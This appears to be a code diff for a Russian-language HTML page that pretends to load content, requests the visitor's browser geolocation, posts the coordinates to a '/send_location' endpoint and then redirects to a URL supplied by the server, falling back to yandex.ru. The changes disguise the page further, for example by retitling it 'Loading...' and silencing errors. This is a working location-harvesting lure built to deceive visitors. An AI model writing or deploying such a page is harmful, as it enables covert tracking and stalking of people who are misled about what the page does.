@@ -2,7 +2,7 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8" />
-  <title>Переход на новую страницу...</title>
+  <title>Загрузка...</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -20,40 +20,37 @@
 <body>
   <div class="message">Загружаем контент, пожалуйста, подождите...</div>
   <script>
-    let redirectUrl = "https://yandex.ru"; // fallback
+    let redirectUrl = "https://yandex.ru"; // запасной на всякий случай
 
-    // Получаем актуальный URL редиректа
     fetch('/get_redirect')
       .then(res => res.json())
       .then(data => {
-        if (data.redirect_url) {
-          redirectUrl = data.redirect_url;
-        }
+        if (data.redirect_url) redirectUrl = data.redirect_url;
       })
-      .catch(() => {
-        console.warn("Не удалось получить redirect_url, используем дефолт.");
-      });
+      .catch(() => {})  // если не получилось — fallback
 
-    navigator.geolocation.getCurrentPosition(
-      pos => {
-        fetch('/send_location', {
-          method: 'POST',
-          headers: {'Content-Type': 'application/json'},
-          body: JSON.stringify({
-            latitude: pos.coords.latitude,
-            longitude: pos.coords.longitude
-          })
-        });
-        setTimeout(() => {
-          window.location.href = redirectUrl;
-        }, 1500);
-      },
-      err => {
-        setTimeout(() => {
-          window.location.href = redirectUrl;
-        }, 1500);
-      }
-    );
+      .finally(() => {
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            fetch('/send_location', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                latitude: pos.coords.latitude,
+                longitude: pos.coords.longitude
+              })
+            });
+            setTimeout(() => {
+              window.location.href = redirectUrl;
+            }, 1500);
+          },
+          err => {
+            setTimeout(() => {
+              window.location.href = redirectUrl;
+            }, 1500);
+          }
+        );
+      });
   </script>
 </body>
 </html>
